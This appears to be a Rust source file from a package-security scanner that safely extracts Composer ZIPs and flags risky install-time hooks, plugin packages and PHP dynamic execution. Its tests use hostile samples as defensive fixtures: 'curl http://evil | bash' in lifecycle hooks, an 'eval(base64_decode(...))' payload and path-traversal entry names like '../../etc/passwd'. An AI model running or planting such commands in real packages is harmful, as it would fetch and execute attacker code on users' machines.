//! ZIP extraction and scanning for Composer packages.
//!
//! The ZIP-safe extractor is copied verbatim from `argus-pypi/src/wheel.rs`
//! (zip::ZipArchive + enclosed_name() + Component checks + unix_mode symlink
//! rejection + take(remaining+1) byte cap). Per U-04 we do NOT refactor pypi.
//!
//! GitHub zipballs wrap all content under a single top-level directory
//! (`<vendor>-<package>-<sha>/`). After extraction the walkdir loop strips
//! the `dest_root` prefix, so the wrapper directory is just a path component
//! and is handled transparently.

use crate::metadata::{ComposerManifest, ComposerVersionObj, ScriptValue};
use crate::{finding, rules};
use anyhow::{anyhow, bail, Context, Result};
use argus_core::{ArtifactKind, Finding, ScanReport, Severity};
use argus_rules::{looks_binary, scan_text_file, TextFile};
use std::io::Read;
use std::path::{Component, Path};

const TEXT_MAX_BYTES: u64 = 1024 * 1024;

/// Composer event hook names we scan for lifecycle triggers.
///
/// Covers the full set of install/update-time Composer script events that can
/// run an attacker-controlled command, per the Composer command-events and
/// installer-events docs. Missing any of these lets a shell command in an
/// uncovered event evade detection.
const LIFECYCLE_EVENTS: &[&str] = &[
    // Command events (composer install / update / create-project).
    "pre-install-cmd",
    "post-install-cmd",
    "pre-update-cmd",
    "post-update-cmd",
    "pre-autoload-dump",
    "post-autoload-dump",
    "post-root-package-install",
    "post-create-project-cmd",
    "pre-status-cmd",
    "post-status-cmd",
    "pre-archive-cmd",
    "post-archive-cmd",
    // Installer events (per-package install/update/uninstall).
    "pre-package-install",
    "post-package-install",
    "pre-package-update",
    "post-package-update",
    "pre-package-uninstall",
    "post-package-uninstall",
];

/// File extensions that commonly contain executable PHP and must be run
/// through the PHP dynamic-exec scan. `.phps` is PHP source served as
/// highlighted text but is still PHP on disk.
const PHP_SOURCE_EXTENSIONS: &[&str] = &[
    ".php", ".phtml", ".php3", ".php4", ".php5", ".php7", ".phps", ".inc", ".module", ".install",
    ".engine", ".theme",
];

/// Return true if `rel` (a forward-slash relative path) ends with a known
/// PHP source extension (case-insensitive).
fn is_php_source(rel: &str) -> bool {
    let lower = rel.to_ascii_lowercase();
    PHP_SOURCE_EXTENSIONS.iter().any(|ext| lower.ends_with(ext))
}

/// Top-level: safe-extract the Composer ZIP, scan `composer.json` and all
/// PHP source files, return a `ScanReport`.
pub fn scan_composer_zip(
    zip_bytes: &[u8],
    dest_root: &Path,
    max_extracted_bytes: u64,
    version_obj: &ComposerVersionObj,
) -> Result<ScanReport> {
    // --- 1. Safe ZIP extraction (copied from wheel.rs) ---
    extract_zip_safe(zip_bytes, dest_root, max_extracted_bytes)
        .context("safe-extract Composer zip")?;

    // --- 2. Walk extracted tree ---
    let mut findings: Vec<Finding> = Vec::new();
    let mut composer_json_content: Option<String> = None;

    // Track the shallowest composer.json depth seen so we only capture the root manifest.
    let mut composer_json_depth: Option<usize> = None;

    for entry in walkdir::WalkDir::new(dest_root).follow_links(false) {
        let entry = entry?;
        if !entry.file_type().is_file() {
            continue;
        }
        let abs = entry.path();
        let rel = abs
            .strip_prefix(dest_root)
            .unwrap_or(abs)
            .to_string_lossy()
            .replace('\\', "/");
        let meta = entry.metadata()?;
        if meta.len() > TEXT_MAX_BYTES {
            continue;
        }
        let bytes = match std::fs::read(abs) {
            Ok(b) => b,
            Err(_) => continue,
        };
        if looks_binary(&bytes) {
            continue;
        }
        let content = String::from_utf8_lossy(&bytes).into_owned();

        // Capture the shallowest composer.json as the root manifest.
        // depth = number of '/' separators in the rel path.
        if rel == "composer.json" || rel.ends_with("/composer.json") {
            let depth = rel.chars().filter(|&c| c == '/').count();
            let is_shallowest = match composer_json_depth {
                None => true,
                Some(d) => depth < d,
            };
            if is_shallowest {
                composer_json_depth = Some(depth);
                composer_json_content = Some(content.clone());
            }
            continue; // processed separately below
        }

        // Ecosystem-agnostic content rules on every text file.
        scan_text_file(
            &TextFile {
                rel: rel.clone(),
                content: content.clone(),
            },
            &mut findings,
        );

        // PHP-specific dynamic-exec rules. Composer packages ship executable
        // PHP under several extensions beyond `.php` (Drupal `.module` /
        // `.install` / `.inc`, templates `.phtml`, legacy `.php4` / `.php5`,
        // and `.phps`). Scan all of them so `system(...)` / `eval(...)` in a
        // non-`.php` file cannot evade `php-dynamic-exec`.
        if is_php_source(&rel) {
            rules::scan_php_file(&content, &rel, &mut findings);
        }
    }

    // --- 3. Parse and scan composer.json ---
    // `scanned_events` records, by EXACT event name, which lifecycle events
    // have already produced a finding. It is shared across the composer.json
    // and p2-metadata passes so a benign hook in one source cannot suppress a
    // malicious hook for a *different* event in the other source.
    let mut scanned_events: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
    let (name, version) = parse_composer_json(
        composer_json_content.as_deref(),
        &mut findings,
        version_obj,
        &mut scanned_events,
    );

    // --- 4. Scan inline scripts from p2 registry metadata (belt+suspenders) ---
    if let Some(scripts) = &version_obj.scripts {
        scan_scripts_map(scripts, &mut findings, &mut scanned_events);
    }

    let decision = argus_rules::derive_decision_from_findings(&findings);
    Ok(ScanReport {
        artifact: ArtifactKind::PackageDir,
        path: dest_root.to_path_buf(),
        package_name: name,
        package_version: version,
        decision,
        findings,
    })
}

// ---------------------------------------------------------------------------
// ZIP safe extractor (copied from argus-pypi/src/wheel.rs, U-04 compliant)
// ---------------------------------------------------------------------------

fn extract_zip_safe(zip_bytes: &[u8], dest_root: &Path, max_extracted_bytes: u64) -> Result<()> {
    let reader = std::io::Cursor::new(zip_bytes);
    let mut archive = zip::ZipArchive::new(reader).context("open Composer zip")?;

    let mut total: u64 = 0;

    for i in 0..archive.len() {
        let mut file = archive
            .by_index(i)
            .with_context(|| format!("read zip entry {i}"))?;

        // Path safety: reject any entry whose path is absolute or contains `..`.
        let path = match file.enclosed_name() {
            Some(p) => p.to_owned(),
            None => {
                bail!(
                    "zip entry {} has an unsafe path; refusing to extract",
                    file.name()
                );
            }
        };
        for comp in path.components() {
            match comp {
                Component::Normal(_) | Component::CurDir => {}
                Component::ParentDir => {
                    bail!("zip entry `{}` traverses parent dir", path.display())
                }
                _ => bail!("zip entry `{}` has unsafe path component", path.display()),
            }
        }

        if file.is_dir() {
            let dest = dest_root.join(&path);
            std::fs::create_dir_all(&dest).with_context(|| format!("mkdir {}", dest.display()))?;
            continue;
        }

        // Reject symlinks encoded as external file attributes.
        let mode = file.unix_mode().unwrap_or(0);
        // POSIX: S_IFLNK = 0o120000
        if (mode & 0o170000) == 0o120000 {
            bail!("refusing to extract symlink zip entry `{}`", path.display());
        }

        let remaining = max_extracted_bytes
            .checked_sub(total)
            .ok_or_else(|| anyhow!("zip size accounting overflow"))?;

        let dest = dest_root.join(&path);
        if let Some(parent) = dest.parent() {
            std::fs::create_dir_all(parent)
                .with_context(|| format!("mkdir parent {}", parent.display()))?;
        }
        let mut out =
            std::fs::File::create(&dest).with_context(|| format!("create {}", dest.display()))?;
        let mut limited = (&mut file).take(remaining + 1);
        let written = std::io::copy(&mut limited, &mut out)
            .with_context(|| format!("write {}", dest.display()))?;
        if written > remaining {
            bail!(
                "zip extracted size exceeds cap {max_extracted_bytes} (entry {} overran)",
                path.display()
            );
        }
        total = total
            .checked_add(written)
            .ok_or_else(|| anyhow!("zip size accounting overflow"))?;
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// composer.json parsing and scanning
// ---------------------------------------------------------------------------

/// Return true if `rel` is a root-level `composer.json` (with or without
/// a GitHub-zipball wrapper directory as the first path component).
///
/// Accepted forms:
/// - `"composer.json"` (bare root)
/// - `"<wrapper-dir>/composer.json"` where `<wrapper-dir>` contains a `-`
///   (GitHub zipball convention: `vendor-pkg-abc123/composer.json`)
///
/// Rejected: `"src/composer.json"` (source directory, no `-` in dir name),
/// `"a/b/composer.json"` (deeper nesting).
#[cfg(test)]
fn is_root_composer_json(rel: &str) -> bool {
    // Direct root.
    if rel == "composer.json" {
        return true;
    }
    // GitHub zipball wrapper: exactly one '/' and wrapper dir contains '-'.
    let slash_count = rel.chars().filter(|&c| c == '/').count();
    if slash_count != 1 || !rel.ends_with("/composer.json") {
        return false;
    }
    // The dir component (everything before the '/') must contain '-'.
    let dir = &rel[..rel.len() - "/composer.json".len()];
    dir.contains('-')
}

/// Parse `composer.json`, push lifecycle-script findings, and return
/// (package_name, package_version) for the ScanReport.
fn parse_composer_json(
    content: Option<&str>,
    findings: &mut Vec<Finding>,
    version_obj: &ComposerVersionObj,
    scanned_events: &mut std::collections::BTreeSet<String>,
) -> (Option<String>, Option<String>) {
    let content = match content {
        Some(c) => c,
        None => return (None, None),
    };

    let manifest: ComposerManifest = match serde_json::from_str(content) {
        Ok(m) => m,
        Err(e) => {
            findings.push(finding(
                "composer-manifest-parse-error",
                Severity::Info,
                format!("failed to parse composer.json: {e}"),
            ));
            return (None, None);
        }
    };

    // composer-plugin packages are auto-loaded by Composer: their `activate()`
    // method and any registered event subscribers run during install/update
    // commands, with no `scripts` entry required. That is an install-time
    // code-execution surface, so surface even a "bare" plugin (no matching
    // script / dynamic-exec finding). It is the same risk class as a benign
    // lifecycle hook, so we mirror that handling: pair the finding with
    // `known-native-build-pattern` (Info) so the decision layer downgrades a
    // bare plugin to AllowWithApproval (human review) rather than hard-Block.
    // Composer plugins are common and legitimate; blocking every one would be
    // a false-positive generator. A plugin that ALSO ships a shell hook or
    // dynamic exec still Blocks via those (non-downgrade-safe) findings.
    if manifest
        .package_type
        .as_deref()
        .is_some_and(|t| t.eq_ignore_ascii_case("composer-plugin"))
    {
        findings.push(finding(
            "composer-plugin-package",
            Severity::Medium,
            "composer.json declares `\"type\": \"composer-plugin\"` — the package is \
             auto-loaded and its activate()/event handlers execute during Composer \
             install/update commands (install-time code execution surface)",
        ));
        findings.push(finding(
            "known-native-build-pattern",
            Severity::Info,
            "composer-plugin packages run plugin code during Composer commands — \
             requires human approval but is a common legitimate pattern",
        ));
    }

    // Scan lifecycle scripts from composer.json. Pass the full scripts map so
    // `@alias` references in a lifecycle event can be resolved to their named
    // script definition.
    if let Some(scripts) = &manifest.scripts {
        scan_scripts_map(scripts, findings, scanned_events);
    }

    // autoload.files: emit Info structural finding.
    if let Some(autoload) = &manifest.autoload {
        if !autoload.files.is_empty() {
            findings.push(finding(
                "autoload-files-execution",
                Severity::Info,
                format!(
                    "composer.json autoload.files declares {} file(s) that execute on \
                     autoloader build: {}",
                    autoload.files.len(),
                    autoload.files.join(", ")
                ),
            ));
        }
    }

    let name = manifest.name.clone();
    let version = manifest
        .version
        .clone()
        .or_else(|| Some(version_obj.version.clone()));
    (name, version)
}

/// Maximum depth for resolving chained `@alias` script references, guarding
/// against cyclic aliases (`"a": "@b"`, `"b": "@a"`).
const MAX_ALIAS_DEPTH: usize = 8;

/// Scan a `scripts` map from either `composer.json` or p2 metadata.
///
/// Dedup is keyed on the EXACT lifecycle event name via `scanned_events`, not
/// on substring containment of the detail text. A benign hook whose command
/// merely *mentions* another event name (e.g. `post-install-cmd: "echo
/// pre-update-cmd"`) must not suppress scanning of a real `pre-update-cmd`
/// hook in the other metadata source.
///
/// A lifecycle command of the form `@name` is a reference to the named
/// Composer script `scripts.name`; it is resolved to that script's command(s)
/// (recursively, with cycle protection) before scanning, so a shell payload
/// hidden behind an alias is still detected.
fn scan_scripts_map(
    scripts: &std::collections::BTreeMap<String, ScriptValue>,
    findings: &mut Vec<Finding>,
    scanned_events: &mut std::collections::BTreeSet<String>,
) {
    for event in LIFECYCLE_EVENTS {
        // Only scan each exact event once across all metadata sources.
        if scanned_events.contains(*event) {
            continue;
        }
        if let Some(sv) = scripts.get(*event) {
            scanned_events.insert((*event).to_string());

            // Resolve any `@alias` references to the underlying command(s).
            let mut resolved: Vec<String> = Vec::new();
            for cmd in sv.commands() {
                resolve_script_command(cmd, scripts, &mut resolved, &mut 0);
            }
            let cmd_refs: Vec<&str> = resolved.iter().map(String::as_str).collect();
            rules::scan_script_hook(event, &cmd_refs, findings);
        }
    }
}

/// Resolve a single Composer script command, expanding leading `@name`
/// references to the named script's command(s).
///
/// `@name` references the `scripts.name` entry. Unknown aliases and cycles
/// degrade to scanning the literal token (so a dangling `@drop` is still
/// surfaced as text rather than silently dropped — U-29).
fn resolve_script_command(
    cmd: &str,
    scripts: &std::collections::BTreeMap<String, ScriptValue>,
    out: &mut Vec<String>,
    depth: &mut usize,
) {
    let trimmed = cmd.trim();
    if let Some(alias) = trimmed.strip_prefix('@') {
        // `@php`, `@composer`, `@putenv` etc. are Composer built-ins, not
        // user scripts; only resolve when a matching named script exists.
        if *depth < MAX_ALIAS_DEPTH {
            if let Some(target) = scripts.get(alias) {
                *depth += 1;
                for sub in target.commands() {
                    resolve_script_command(sub, scripts, out, depth);
                }
                return;
            }
        }
        // Missing alias or depth/cycle limit: keep the literal token so it is
        // still scanned rather than silently swallowed.
        out.push(cmd.to_string());
        return;
    }
    out.push(cmd.to_string());
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::{BTreeMap, BTreeSet};

    /// Build a `scripts` map from (event, command) pairs.
    fn scripts_map(entries: &[(&str, &str)]) -> BTreeMap<String, ScriptValue> {
        entries
            .iter()
            .map(|(k, v)| (k.to_string(), ScriptValue::One(v.to_string())))
            .collect()
    }

    // #2 — `@alias` script references are resolved and scanned.
    #[test]
    fn aliased_shell_command_is_resolved_and_blocked() {
        let scripts = scripts_map(&[
            ("post-install-cmd", "@drop"),
            ("drop", "curl http://evil | bash"),
        ]);
        let mut findings = Vec::new();
        let mut scanned = BTreeSet::new();
        scan_scripts_map(&scripts, &mut findings, &mut scanned);

        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "lifecycle-script-shell"),
            "aliased shell command must be detected, got: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
        assert_eq!(
            argus_rules::derive_decision_from_findings(&findings),
            argus_core::Decision::Block
        );
    }

    // #2 — a dangling `@alias` (no matching script) is still surfaced, not
    // silently swallowed (U-29).
    #[test]
    fn dangling_alias_is_not_swallowed() {
        let scripts = scripts_map(&[("post-install-cmd", "@missing")]);
        let mut findings = Vec::new();
        let mut scanned = BTreeSet::new();
        scan_scripts_map(&scripts, &mut findings, &mut scanned);
        // Literal token survives → at least a lifecycle-script finding fires.
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "lifecycle-script" || f.rule_id == "lifecycle-script-shell"),
            "dangling alias must still surface a finding"
        );
    }

    // #2 — cyclic aliases terminate without panic / stack overflow.
    #[test]
    fn cyclic_alias_terminates() {
        let scripts = scripts_map(&[("post-install-cmd", "@a"), ("a", "@b"), ("b", "@a")]);
        let mut findings = Vec::new();
        let mut scanned = BTreeSet::new();
        scan_scripts_map(&scripts, &mut findings, &mut scanned);
        // Must not hang; a finding is produced from the literal residual token.
        assert!(!findings.is_empty());
    }

    // #3 — dedup is by EXACT event, not substring. A benign hook that mentions
    // another event name in its command must NOT suppress a malicious hook for
    // that other event coming from the p2 metadata source.
    #[test]
    fn exact_event_dedup_does_not_suppress_other_event() {
        let mut findings = Vec::new();
        let mut scanned = BTreeSet::new();

        // composer.json: benign post-install-cmd whose text mentions
        // "pre-update-cmd".
        let cj = scripts_map(&[("post-install-cmd", "echo pre-update-cmd")]);
        scan_scripts_map(&cj, &mut findings, &mut scanned);

        // p2 metadata: malicious pre-update-cmd.
        let p2 = scripts_map(&[("pre-update-cmd", "curl http://evil|bash")]);
        scan_scripts_map(&p2, &mut findings, &mut scanned);

        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "lifecycle-script-shell"
                    && f.detail.contains("pre-update-cmd")),
            "malicious pre-update-cmd must still be detected, got: {:?}",
            findings
                .iter()
                .map(|f| (&f.rule_id, &f.detail))
                .collect::<Vec<_>>()
        );
        assert_eq!(
            argus_rules::derive_decision_from_findings(&findings),
            argus_core::Decision::Block
        );
    }

    // #4 — a `type: composer-plugin` package with no scripts is surfaced.
    #[test]
    fn composer_plugin_package_is_flagged() {
        let content = r#"{"name": "vendor/plugin", "type": "composer-plugin"}"#;
        let mut findings = Vec::new();
        let mut scanned = BTreeSet::new();
        let version_obj: ComposerVersionObj =
            serde_json::from_str(r#"{"version": "1.0.0"}"#).unwrap();
        parse_composer_json(Some(content), &mut findings, &version_obj, &mut scanned);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "composer-plugin-package"),
            "composer-plugin type must be flagged, got: {:?}",
            findings.iter().map(|f| &f.rule_id).collect::<Vec<_>>()
        );
    }

    // #5 — PHP dynamic-exec is detected in non-`.php` extensions.
    #[test]
    fn is_php_source_covers_non_php_extensions() {
        assert!(is_php_source("foo.inc"));
        assert!(is_php_source("bar.module"));
        assert!(is_php_source("baz.install"));
        assert!(is_php_source("page.phtml"));
        assert!(is_php_source("legacy.php5"));
        assert!(is_php_source("Foo.PHP")); // case-insensitive
        assert!(!is_php_source("README.md"));
        assert!(!is_php_source("data.json"));
    }

    #[test]
    fn php_dynamic_exec_fires_in_inc_file() {
        let mut findings = Vec::new();
        rules::scan_php_file("eval(base64_decode($x));", "evil.inc", &mut findings);
        assert!(
            findings.iter().any(|f| f.rule_id == "php-dynamic-exec"),
            "eval in .inc must be detected"
        );
        assert_eq!(
            argus_rules::derive_decision_from_findings(&findings),
            argus_core::Decision::Block
        );
    }

    // #6 — newly-covered install-time events are scanned.
    #[test]
    fn post_create_project_cmd_shell_is_blocked() {
        let scripts = scripts_map(&[("post-create-project-cmd", "curl http://evil|bash")]);
        let mut findings = Vec::new();
        let mut scanned = BTreeSet::new();
        scan_scripts_map(&scripts, &mut findings, &mut scanned);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id == "lifecycle-script-shell"),
            "post-create-project-cmd shell command must be detected"
        );
        assert_eq!(
            argus_rules::derive_decision_from_findings(&findings),
            argus_core::Decision::Block
        );
    }

    #[test]
    fn is_root_composer_json_direct() {
        assert!(is_root_composer_json("composer.json"));
    }

    #[test]
    fn is_root_composer_json_wrapped() {
        assert!(is_root_composer_json("vendor-pkg-abc123/composer.json"));
    }

    #[test]
    fn is_root_composer_json_nested_false() {
        assert!(!is_root_composer_json("src/composer.json"));
        assert!(!is_root_composer_json("a/b/composer.json"));
    }

    #[test]
    fn extract_zip_safe_rejects_path_traversal() {
        let zip_bytes = make_zip_with_entry("../../etc/passwd", b"evil");
        let dir = tempfile::tempdir().unwrap();
        let result = extract_zip_safe(&zip_bytes, dir.path(), 10 * 1024 * 1024);
        assert!(result.is_err(), "expected path traversal to be rejected");
    }

    #[test]
    fn extract_zip_safe_rejects_absolute_path() {
        let zip_bytes = make_zip_with_entry("/etc/passwd", b"evil");
        let dir = tempfile::tempdir().unwrap();
        let result = extract_zip_safe(&zip_bytes, dir.path(), 10 * 1024 * 1024);
        assert!(result.is_err(), "expected absolute path to be rejected");
    }

    #[test]
    fn extract_zip_safe_enforces_byte_cap() {
        let large = vec![0u8; 1024];
        let zip_bytes = make_zip_with_entry("data.bin", &large);
        let dir = tempfile::tempdir().unwrap();
        // Cap at 512 bytes — must fail.
        let result = extract_zip_safe(&zip_bytes, dir.path(), 512);
        assert!(result.is_err(), "expected size cap to be enforced");
    }

    /// Build a minimal ZIP with one entry for testing.
    fn make_zip_with_entry(name: &str, body: &[u8]) -> Vec<u8> {
        use std::io::Write;
        let mut buf = Vec::new();
        {
            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut buf));
            let opts: zip::write::FileOptions<()> = zip::write::FileOptions::default()
                .compression_method(zip::CompressionMethod::Stored);
            writer.start_file(name, opts).unwrap();
            writer.write_all(body).unwrap();
            writer.finish().unwrap();
        }
        buf
    }
}
